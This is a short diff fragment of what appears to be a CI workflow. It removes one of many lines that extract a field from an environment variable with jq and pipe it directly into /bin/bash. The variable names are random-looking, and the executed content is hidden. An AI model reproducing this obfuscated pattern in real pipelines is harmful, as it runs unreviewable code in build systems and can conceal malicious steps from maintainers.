@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$psu3" | jq -r .dw33 | /bin/bash
           echo $dmjv7412 | jq -r .jt94933 | /bin/bash
           echo $acd1739 | jq -r .uovxi188 | /bin/bash
-          echo $wayye73787 | jq -r .ondwp060 | /bin/bash
           printf '%s' "$imnms71034" | jq -r .taku993 | /bin/bash
           printf '%s' "$xfzmv045" | jq -r .g07 | /bin/bash
           printf '%s' "$n9643" | jq -r .yqot155 | /bin/bash
